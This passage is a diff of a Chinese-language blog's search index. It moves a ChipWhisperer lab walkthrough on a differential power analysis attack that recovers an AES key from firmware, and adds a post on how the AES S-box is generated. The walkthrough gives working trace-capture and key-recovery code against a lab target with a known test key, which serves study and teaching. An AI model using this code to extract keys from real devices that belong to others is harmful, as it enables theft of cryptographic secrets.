full_diffs_list.append(full_diffs[:])</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#Get argument sort, as each index is the actual key guess.</span></span><br><span class="line">    sorted_args = np.argsort(max_diffs)[::-<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#Keep most likely</span></span><br><span class="line">    key_guess.append(sorted_args[<span class="number">0</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#Print results</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Subkey %2d - most likely %02X (actual %02X)&quot;</span>%(subkey, key_guess[subkey], known_key[subkey]))</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#Print other top guesses</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; Top 5 guesses: &quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">5</span>):</span><br><span class="line">        g = sorted_args[i]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;   %02X - Diff = %f&quot;</span>%(g, max_diffs[g]))</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<img src="https://re1own.github.io/assets/img/测信道攻击——用DPA攻击固件中的AES/image-20230527041851759.png" alt="image-20230527041851759" style="zoom:50%;">
+
+<p>画出猜测错误key的前几个可能值和真实key的差异图</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cw.plot(full_diffs_list[<span class="number">0</span>][<span class="number">0x2B</span>]) * cw.plot(full_diffs_list[<span class="number">0</span>][<span class="number">0x40</span>]) * cw.plot(full_diffs_list[<span class="number">0</span>][<span class="number">0xBF</span>])</span><br></pre></td></tr></table></figure>
+
+<p>正确key的峰形会在某些地方拥有比错误key的峰形高。</p>
+<img src="https://re1own.github.io/assets/img/测信道攻击——用DPA攻击固件中的AES/image-20230527043707408.png" alt="image-20230527043707408" style="zoom:50%;">
+
+<p>有关幽灵峰的问题之后再细补充</p>
+<p>Reference</p>
+<p><a href="https://github.com/newaetech/chipwhisperer-jupyter">Chipwhisperer-Jupyter</a></p>
+]]></content>
+      <tags>
+        <tag>SCA</tag>
+        <tag>AES</tag>
+        <tag>DPA</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>测信道攻击——利用能耗破解密码</title>
     <url>/2023/05/24/%E6%B5%8B%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E5%88%A9%E7%94%A8%E8%83%BD%E8%80%97%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/</url>
     <content><![CDATA[<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>硬件设置：</p>
@@ -2202,84 +2321,45 @@
       </tags>
   </entry>
   <entry>
-    <title>测信道攻击——用DPA攻击固件中的AES</title>
-    <url>/2023/05/26/%E6%B5%8B%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E7%94%A8DPA%E6%94%BB%E5%87%BB%E5%9B%BA%E4%BB%B6%E4%B8%AD%E7%9A%84AES/</url>
-    <content><![CDATA[<p>上篇攻击AES的方法其实属于SPA，本实验用更牛逼的方法，DPA来攻击AES，而且是货真价实的AES。关于DPA，我前面有篇博客有所讲解（<a href="https://re1own.github.io/2023/05/20/SCA/">初识测信道攻击</a>)。下面开始环境配置，这里需要注意的是，notebook中给出的SS_VER是’SS_VER_1_1’，我运行后总是失败，换成前面实验用的SS_VER_2_1就好了。这里编译、上传固件、安装就不多解释了，与之前实验一致。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SCOPETYPE = &#x27;OPENADC&#x27;</span><br><span class="line">PLATFORM = &#x27;CWLITEARM&#x27;</span><br><span class="line">CRYPTO_TARGET=&#x27;TINYAES128C&#x27;</span><br><span class="line">SS_VER=&#x27;SS_VER_2_1&#x27;</span><br></pre></td></tr></table></figure>
+    <title>理解AES_S-box盒生成</title>
+    <url>/2023/06/18/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/</url>
+    <content><![CDATA[<p>一开始，我以为S-box这玩意就是随便找的一个map去做substitution，但仔细研究发现原来这里面数学原理深奥去了。光S-box的生成就很有意思，核心就是求多项式的逆元和访射变化，之后有大量时间再做更深层次的分析，本次对AES中的S-box的生成做一个笔记，学习AES是为了了解它的数学设计思想，为之后理解<strong>Number theoretic transform</strong>热身。</p>
+<h2 id="求乘法逆元"><a href="#求乘法逆元" class="headerlink" title="求乘法逆元"></a>求乘法逆元</h2><p>首先，对于S-box是行从00~ff，列也是从00～ff的一个matrix，也就是有限域GF(2^8)的所有element（0～255）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F </span><br><span class="line">10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F</span><br><span class="line">20 21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F </span><br><span class="line">30 31 32 33 34 35 36 37 38 39 3A 3B 3C 3D 3E 3F</span><br><span class="line">40 41 42 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F </span><br><span class="line">50 51 52 53 54 55 56 57 58 59 5A 5B 5C 5D 5E 5F</span><br><span class="line">60 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F </span><br><span class="line">70 71 72 73 74 75 76 77 78 79 7A 7B 7C 7D 7E 7F</span><br><span class="line">80 81 82 83 84 85 86 87 88 89 8A 8B 8C 8D 8E 8F </span><br><span class="line">90 91 92 93 94 95 96 97 98 99 9A 9B 9C 9D 9E 9F</span><br><span class="line">A0 A1 A2 A3 A4 A5 A6 A7 A8 A9 AA AB AC AD AE AF </span><br><span class="line">B0 B1 B2 B3 B4 B5 B6 B7 B8 B9 BA BB BC BD BE BF</span><br><span class="line">C0 C1 C2 C3 C4 C5 C6 C7 C8 C9 CA CB CC CD CE CF </span><br><span class="line">D0 D1 D2 D3 D4 D5 D6 D7 D8 D9 DA DB DC DD DE DF</span><br><span class="line">E0 E1 E2 E3 E4 E5 E6 E7 E8 E9 EA EB EC ED EE EF </span><br><span class="line">F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%run &quot;../../Setup_Scripts/Setup_Generic.ipynb&quot;</span><br></pre></td></tr></table></figure>
+<p>把每个字节看成一个多项式用来表达它的二进制形式，ai代表第i比特位的值（0或者1）</p>
+<p><img src="https://re1own.github.io/assets/img/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/image-20230618042704999.png" alt="image-20230618042704999"></p>
+<p><img src="https://re1own.github.io/assets/img/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/image-20230618043439441.png" alt="image-20230618043439441"></p>
+<p>将矩阵里的所有elements都求它的乘法逆元</p>
+<p>00的逆元就是00本身</p>
+<p><img src="https://re1own.github.io/assets/img/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/image-20230618043730475.png" alt="image-20230618043730475"></p>
+<p>最重要的是如何计算多项式的乘法逆元，a(x)就是此时的字节，m(x)是一个固定的不可约多项式（因式只有1和它本身）</p>
+<p><img src="https://re1own.github.io/assets/img/%E7%90%86%E8%A7%A3AES-S-box%E7%9B%92%E7%94%9F%E6%88%90/image-20230618044228637.png" alt="image-20230618044228637"></p>
+<p>这里提一句，这个S-box的设计真的给AES带来了很强的扩展性，光m(x)其实就可以扩展使用其他的数来代替，比如下面这些，RJNDAEL选择了0x11b，也就是上述的m(x)多项式，关于这块想更了解的可以看这篇论文<a href="https://www.sciencedirect.com/science/article/pii/S2212017313006051">Generation of AES S-Boxes with various modulus and additive constant polynomials and testing their randomization</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">11B, 11D, 12B, 12D, 139, 13F, 14D, 15F, 163, 165, 169, 171, 177, 17B, 187, 18B, 18D, 19F, 1A3, 1A9, 1B1, 1BD, 1C3, 1CF, 1D7, 1DD, 1E7, 1F3, 1F5, 1F9.</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%%bash -s <span class="string">&quot;<span class="variable">$PLATFORM</span>&quot;</span> <span class="string">&quot;<span class="variable">$CRYPTO_TARGET</span>&quot;</span> <span class="string">&quot;<span class="variable">$SS_VER</span>&quot;</span></span><br><span class="line"><span class="built_in">cd</span> ../../../hardware/victims/firmware/simpleserial-aes</span><br><span class="line">make PLATFORM=<span class="variable">$1</span> CRYPTO_TARGET=<span class="variable">$2</span> SS_VER=<span class="variable">$3</span> -j</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cw.program_target(scope, prog, &quot;../../../hardware/victims/firmware/simpleserial-aes/simpleserial-aes-&#123;&#125;.hex&quot;.format(PLATFORM))</span><br></pre></td></tr></table></figure>
-
-<p>抓取2500条能量迹</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tnrange</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">ktp = cw.ktp.Basic()</span><br><span class="line">trace_array = []</span><br><span class="line">textin_array = []</span><br><span class="line"></span><br><span class="line">key, text = ktp.<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">target.set_key(key)</span><br><span class="line"></span><br><span class="line">N = <span class="number">2500</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tnrange(N, desc=<span class="string">&#x27;Capturing traces&#x27;</span>):</span><br><span class="line">    scope.arm()</span><br><span class="line">    </span><br><span class="line">    target.simpleserial_write(<span class="string">&#x27;p&#x27;</span>, text)</span><br><span class="line">    </span><br><span class="line">    ret = scope.capture()</span><br><span class="line">    <span class="keyword">if</span> ret:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Target timed out!&quot;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">    response = target.simpleserial_read(<span class="string">&#x27;r&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    trace_array.append(scope.get_last_trace())</span><br><span class="line">    textin_array.append(text)</span><br><span class="line">    </span><br><span class="line">    key, text = ktp.<span class="built_in">next</span>()</span><br></pre></td></tr></table></figure>
-
-<p>在实验<a href="https://re1own.github.io/2023/05/25/%E6%B5%8B%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E5%88%A9%E7%94%A8%E4%B8%80%E4%B8%AAbit%E6%81%A2%E5%A4%8DAES-key/">利用一个bit恢复AES key</a>中之所以能成功是攻击流中存在S-box。本次实验使用能量分析去破解AES密钥。之前的方法能生效是因为我们攻击的数据流就在S-box中，而实战中我们不知道数值，只知道能量消耗，要找到他们对应的二进制是比较困难的。而本攻击方式是利用S-box输出结果的一个bit（无论哪个都行）将能量分成两个部分（0和1），利用1消耗能量是大于0的，而且根据之前的实验，数据总线中数据的值与能量消耗之间有一定联系。DPA分析AES只需要整个能量迹包含了加密流程发生的时间段。</p>
-<p>S-box是固定的：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sbox = [</span><br><span class="line">    <span class="comment"># 0    1    2    3    4    5    6    7    8    9    a    b    c    d    e    f </span></span><br><span class="line">    <span class="number">0x63</span>,<span class="number">0x7c</span>,<span class="number">0x77</span>,<span class="number">0x7b</span>,<span class="number">0xf2</span>,<span class="number">0x6b</span>,<span class="number">0x6f</span>,<span class="number">0xc5</span>,<span class="number">0x30</span>,<span class="number">0x01</span>,<span class="number">0x67</span>,<span class="number">0x2b</span>,<span class="number">0xfe</span>,<span class="number">0xd7</span>,<span class="number">0xab</span>,<span class="number">0x76</span>, <span class="comment"># 0</span></span><br><span class="line">    <span class="number">0xca</span>,<span class="number">0x82</span>,<span class="number">0xc9</span>,<span class="number">0x7d</span>,<span class="number">0xfa</span>,<span class="number">0x59</span>,<span class="number">0x47</span>,<span class="number">0xf0</span>,<span class="number">0xad</span>,<span class="number">0xd4</span>,<span class="number">0xa2</span>,<span class="number">0xaf</span>,<span class="number">0x9c</span>,<span class="number">0xa4</span>,<span class="number">0x72</span>,<span class="number">0xc0</span>, <span class="comment"># 1</span></span><br><span class="line">    <span class="number">0xb7</span>,<span class="number">0xfd</span>,<span class="number">0x93</span>,<span class="number">0x26</span>,<span class="number">0x36</span>,<span class="number">0x3f</span>,<span class="number">0xf7</span>,<span class="number">0xcc</span>,<span class="number">0x34</span>,<span class="number">0xa5</span>,<span class="number">0xe5</span>,<span class="number">0xf1</span>,<span class="number">0x71</span>,<span class="number">0xd8</span>,<span class="number">0x31</span>,<span class="number">0x15</span>, <span class="comment"># 2</span></span><br><span class="line">    <span class="number">0x04</span>,<span class="number">0xc7</span>,<span class="number">0x23</span>,<span class="number">0xc3</span>,<span class="number">0x18</span>,<span class="number">0x96</span>,<span class="number">0x05</span>,<span class="number">0x9a</span>,<span class="number">0x07</span>,<span class="number">0x12</span>,<span class="number">0x80</span>,<span class="number">0xe2</span>,<span class="number">0xeb</span>,<span class="number">0x27</span>,<span class="number">0xb2</span>,<span class="number">0x75</span>, <span class="comment"># 3</span></span><br><span class="line">    <span class="number">0x09</span>,<span class="number">0x83</span>,<span class="number">0x2c</span>,<span class="number">0x1a</span>,<span class="number">0x1b</span>,<span class="number">0x6e</span>,<span class="number">0x5a</span>,<span class="number">0xa0</span>,<span class="number">0x52</span>,<span class="number">0x3b</span>,<span class="number">0xd6</span>,<span class="number">0xb3</span>,<span class="number">0x29</span>,<span class="number">0xe3</span>,<span class="number">0x2f</span>,<span class="number">0x84</span>, <span class="comment"># 4</span></span><br><span class="line">    <span class="number">0x53</span>,<span class="number">0xd1</span>,<span class="number">0x00</span>,<span class="number">0xed</span>,<span class="number">0x20</span>,<span class="number">0xfc</span>,<span class="number">0xb1</span>,<span class="number">0x5b</span>,<span class="number">0x6a</span>,<span class="number">0xcb</span>,<span class="number">0xbe</span>,<span class="number">0x39</span>,<span class="number">0x4a</span>,<span class="number">0x4c</span>,<span class="number">0x58</span>,<span class="number">0xcf</span>, <span class="comment"># 5</span></span><br><span class="line">    <span class="number">0xd0</span>,<span class="number">0xef</span>,<span class="number">0xaa</span>,<span class="number">0xfb</span>,<span class="number">0x43</span>,<span class="number">0x4d</span>,<span class="number">0x33</span>,<span class="number">0x85</span>,<span class="number">0x45</span>,<span class="number">0xf9</span>,<span class="number">0x02</span>,<span class="number">0x7f</span>,<span class="number">0x50</span>,<span class="number">0x3c</span>,<span class="number">0x9f</span>,<span class="number">0xa8</span>, <span class="comment"># 6</span></span><br><span class="line">    <span class="number">0x51</span>,<span class="number">0xa3</span>,<span class="number">0x40</span>,<span class="number">0x8f</span>,<span class="number">0x92</span>,<span class="number">0x9d</span>,<span class="number">0x38</span>,<span class="number">0xf5</span>,<span class="number">0xbc</span>,<span class="number">0xb6</span>,<span class="number">0xda</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0xff</span>,<span class="number">0xf3</span>,<span class="number">0xd2</span>, <span class="comment"># 7</span></span><br><span class="line">    <span class="number">0xcd</span>,<span class="number">0x0c</span>,<span class="number">0x13</span>,<span class="number">0xec</span>,<span class="number">0x5f</span>,<span class="number">0x97</span>,<span class="number">0x44</span>,<span class="number">0x17</span>,<span class="number">0xc4</span>,<span class="number">0xa7</span>,<span class="number">0x7e</span>,<span class="number">0x3d</span>,<span class="number">0x64</span>,<span class="number">0x5d</span>,<span class="number">0x19</span>,<span class="number">0x73</span>, <span class="comment"># 8</span></span><br><span class="line">    <span class="number">0x60</span>,<span class="number">0x81</span>,<span class="number">0x4f</span>,<span class="number">0xdc</span>,<span class="number">0x22</span>,<span class="number">0x2a</span>,<span class="number">0x90</span>,<span class="number">0x88</span>,<span class="number">0x46</span>,<span class="number">0xee</span>,<span class="number">0xb8</span>,<span class="number">0x14</span>,<span class="number">0xde</span>,<span class="number">0x5e</span>,<span class="number">0x0b</span>,<span class="number">0xdb</span>, <span class="comment"># 9</span></span><br><span class="line">    <span class="number">0xe0</span>,<span class="number">0x32</span>,<span class="number">0x3a</span>,<span class="number">0x0a</span>,<span class="number">0x49</span>,<span class="number">0x06</span>,<span class="number">0x24</span>,<span class="number">0x5c</span>,<span class="number">0xc2</span>,<span class="number">0xd3</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,<span class="number">0x91</span>,<span class="number">0x95</span>,<span class="number">0xe4</span>,<span class="number">0x79</span>, <span class="comment"># a</span></span><br><span class="line">    <span class="number">0xe7</span>,<span class="number">0xc8</span>,<span class="number">0x37</span>,<span class="number">0x6d</span>,<span class="number">0x8d</span>,<span class="number">0xd5</span>,<span class="number">0x4e</span>,<span class="number">0xa9</span>,<span class="number">0x6c</span>,<span class="number">0x56</span>,<span class="number">0xf4</span>,<span class="number">0xea</span>,<span class="number">0x65</span>,<span class="number">0x7a</span>,<span class="number">0xae</span>,<span class="number">0x08</span>, <span class="comment"># b</span></span><br><span class="line">    <span class="number">0xba</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,<span class="number">0x2e</span>,<span class="number">0x1c</span>,<span class="number">0xa6</span>,<span class="number">0xb4</span>,<span class="number">0xc6</span>,<span class="number">0xe8</span>,<span class="number">0xdd</span>,<span class="number">0x74</span>,<span class="number">0x1f</span>,<span class="number">0x4b</span>,<span class="number">0xbd</span>,<span class="number">0x8b</span>,<span class="number">0x8a</span>, <span class="comment"># c</span></span><br><span class="line">    <span class="number">0x70</span>,<span class="number">0x3e</span>,<span class="number">0xb5</span>,<span class="number">0x66</span>,<span class="number">0x48</span>,<span class="number">0x03</span>,<span class="number">0xf6</span>,<span class="number">0x0e</span>,<span class="number">0x61</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0xb9</span>,<span class="number">0x86</span>,<span class="number">0xc1</span>,<span class="number">0x1d</span>,<span class="number">0x9e</span>, <span class="comment"># d</span></span><br><span class="line">    <span class="number">0xe1</span>,<span class="number">0xf8</span>,<span class="number">0x98</span>,<span class="number">0x11</span>,<span class="number">0x69</span>,<span class="number">0xd9</span>,<span class="number">0x8e</span>,<span class="number">0x94</span>,<span class="number">0x9b</span>,<span class="number">0x1e</span>,<span class="number">0x87</span>,<span class="number">0xe9</span>,<span class="number">0xce</span>,<span class="number">0x55</span>,<span class="number">0x28</span>,<span class="number">0xdf</span>, <span class="comment"># e</span></span><br><span class="line">    <span class="number">0x8c</span>,<span class="number">0xa1</span>,<span class="number">0x89</span>,<span class="number">0x0d</span>,<span class="number">0xbf</span>,<span class="number">0xe6</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x41</span>,<span class="number">0x99</span>,<span class="number">0x2d</span>,<span class="number">0x0f</span>,<span class="number">0xb0</span>,<span class="number">0x54</span>,<span class="number">0xbb</span>,<span class="number">0x16</span>  <span class="comment"># f</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_internal</span>(<span class="params">inputdata, key</span>):</span></span><br><span class="line">    <span class="keyword">return</span> sbox[inputdata ^ key]</span><br></pre></td></tr></table></figure>
-
-<p>0，1两组对比的能量线</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">%matplotlib notebook</span><br><span class="line"><span class="keyword">import</span> matplotlib.pylab <span class="keyword">as</span> plt</span><br><span class="line">plt.figure()</span><br><span class="line">plt.plot(trace_array[<span class="number">0</span>])</span><br><span class="line">plt.plot(trace_array[<span class="number">1</span>])</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
-
-<img src="https://re1own.github.io/assets/img/测信道攻击——用DPA攻击固件中的AES/image-20230527014113362.png" alt="image-20230527014113362" style="zoom:50%;">
-
-<p>查看输入数据</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(textin_array[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(textin_array[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">CWbytearray(<span class="string">b&#x27;39 79 82 4f 97 0e a3 b9 1d 07 14 78 df 3c a7 89&#x27;</span>)</span><br><span class="line">CWbytearray(<span class="string">b&#x27;c7 81 5d dd fe e3 29 b5 b4 3e 53 17 6f b3 37 4e&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>定义能量迹的数量和每条能量迹的点的数量</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">numtraces = np.shape(trace_array)[<span class="number">0</span>] <span class="comment">#total number of traces</span></span><br><span class="line">numpoints = np.shape(trace_array)[<span class="number">1</span>] <span class="comment">#samples per trace</span></span><br></pre></td></tr></table></figure>
-
-<p>对两组能量迹取平均值，再取两者差的绝对值，看谁最大谁就最可能是密钥了</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">guess_byte = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> guess <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    </span><br><span class="line">    one_list = []</span><br><span class="line">    zero_list = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> trace_index <span class="keyword">in</span> <span class="built_in">range</span>(numtraces):</span><br><span class="line">    </span><br><span class="line">        input_byte = textin_array[trace_index][guess_byte]</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#Get a hypothetical leakage list - use aes_internal(guess, input_byte)     </span></span><br><span class="line">        hypothetical_leakage = aes_internal(guess, input_byte)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (hypothetical_leakage &amp; <span class="number">0x01</span>) == <span class="number">1</span>:</span><br><span class="line">            one_list.append(trace_array[trace_index])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            zero_list.append(trace_array[trace_index])</span><br><span class="line">            </span><br><span class="line">    one_avg = np.mean(np.array(one_list), axis = <span class="number">0</span>)</span><br><span class="line">    zero_avg = np.mean(np.array(zero_list), axis = <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    max_diff_value = <span class="built_in">max</span>(<span class="built_in">abs</span>(one_avg -zero_avg))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Guessing &#123;:02x&#125;: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(guess, max_diff_value))</span><br></pre></td></tr></table></figure>
-
-<p>发现0x2b最大，即2b为key的第一个字节</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Guessing 00: 0.0016756559017779837</span><br><span class="line">Guessing 01: 0.0016902979846054461</span><br><span class="line">Guessing 02: 0.0015728231728371483</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">Guessing 2a: 0.0015339731742831531</span><br><span class="line">Guessing 2b: 0.0059058167148595825</span><br><span class="line">Guessing 2c: 0.0016990212661401327</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">Guessing fe: 0.0014141100475279222</span><br><span class="line">Guessing ff: 0.002171968556943134</span><br></pre></td></tr></table></figure>
-
-<p>计算差异的函数，也用来解决幽灵峰问题</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate_diffs</span>(<span class="params">guess, byteindex=<span class="number">0</span>, bitnum=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Perform a simple DPA on two traces, uses global `textin_array` and `trace_array` &quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    one_list = []</span><br><span class="line">    zero_list = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> trace_index <span class="keyword">in</span> <span class="built_in">range</span>(numtraces):</span><br><span class="line">        hypothetical_leakage = aes_internal(guess, textin_array[trace_index][byteindex])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#Mask off the requested bit</span></span><br><span class="line">        <span class="keyword">if</span> hypothetical_leakage &amp; (<span class="number">1</span>&lt;&lt;bitnum):</span><br><span class="line">            one_list.append(trace_array[trace_index])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            zero_list.append(trace_array[trace_index])</span><br><span class="line"></span><br><span class="line">    one_avg = np.asarray(one_list).mean(axis=<span class="number">0</span>)</span><br><span class="line">    zero_avg = np.asarray(zero_list).mean(axis=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">abs</span>(one_avg - zero_avg)</span><br></pre></td></tr></table></figure>
-
-<p>查看不同key对应的差异图</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cw.plot(calculate_diffs(0x2B)) * cw.plot(calculate_diffs(0x2C)) * cw.plot(calculate_diffs(0x2D))</span><br></pre></td></tr></table></figure>
-
-
-
-<img src="https://re1own.github.io/assets/img/测信道攻击——用DPA攻击固件中的AES/image-20230527040527620.png" alt="image-20230527040527620" style="zoom:50%;">
-
-<p>最后就是把剩下的字节都猜了，补全代码</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tnrange</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment">#Store your key_guess here, compare to known_key</span></span><br><span class="line">key_guess = []</span><br><span class="line">known_key = [<span class="number">0x2b</span>, <span class="number">0x7e</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x28</span>, <span class="number">0xae</span>, <span class="number">0xd2</span>, <span class="number">0xa6</span>, <span class="number">0xab</span>, <span class="number">0xf7</span>, <span class="number">0x15</span>, <span class="number">0x88</span>, <span class="number">0x09</span>, <span class="number">0xcf</span>, <span class="number">0x4f</span>, <span class="number">0x3c</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> subkey <span class="keyword">in</span> tnrange(<span class="number">0</span>, <span class="number">16</span>, desc=<span class="string">&quot;Attacking Subkey&quot;</span>):</span><br><span class="line">    max_list=[]</span><br><span class="line">    <span class="keyword">for</span> guess <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        max_diff_value = <span class="built_in">max</span>(calculate_diffs(guess, subkey))</span><br><span class="line">        max_list.append(max_diff_value)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Subkey &#123;&#125; - most likelv &#123;:02x&#125; (actual &#123;:02x&#125;)&#x27;</span>.<span class="built_in">format</span>(subkey,np.argsort(max_list)[::-<span class="number">1</span>][<span class="number">0</span>], known_key[subkey]))</span><br></pre></td></tr></table></figure>
-
-<p>结果来看都猜对了！</p>
-<img src="https://re1own.github.io/assets/img/测信道攻击——用DPA攻击固件中的AES/image-20230527041126582.png" alt="image-20230527041126582" style="zoom:50%;">
-
-<p>我这次实验是成功了，但也有一些情况是没有成功的，下面是关于DPA攻击失败的一些问题以及解决方式</p>
-<ul>
-<li>抓取的是幽灵峰的话可以尝试增加抓取的能量迹数量</li>
-<li>修改攻击的目标位数，如最低位改为第三位，或者把很多位的结果都跑一下综合一下</li>
-</ul>
-<p>如何解决幽灵峰的问题</p>
-<p>先运行下这段准备好的DPA攻击代码</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tnrange</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment">#Store your key_guess here, compare to known_key</span></span><br><span class="line">key_guess = []</span><br><span class="line">known_key = [<span class="number">0x2b</span>, <span class="number">0x7e</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x28</span>, <span class="number">0xae</span>, <span class="number">0xd2</span>, <span class="number">0xa6</span>, <span class="number">0xab</span>, <span class="number">0xf7</span>, <span class="number">0x15</span>, <span class="number">0x88</span>, <span class="number">0x09</span>, <span class="number">0xcf</span>, <span class="number">0x4f</span>, <span class="number">0x3c</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#Which bit to target</span></span><br><span class="line">bitnum = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">full_diffs_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> subkey <span class="keyword">in</span> tnrange(<span class="number">0</span>, <span class="number">1</span>, desc=<span class="string">&quot;Attacking Subkey&quot;</span>):</span><br><span class="line">    </span><br><span class="line">    max_diffs = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line">    full_diffs = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> guess <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">        full_diff_trace = calculate_diffs(guess, subkey, bitnum)</span><br><span class="line">        max_diffs[guess] = np.<span class="built_in">max</span>(full_diff_trace)</span><br><span class="line">        full_diffs[guess] = full_diff_trace</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#Make copy of the list</span></span><br><span class="line">    full_diffs_list.append(full_diffs[:])</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#Get argument sort, as each index is the actual key guess.</span></span><br><span class="line">    sorted_args = np.argsort(max_diffs)[::-<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    <span 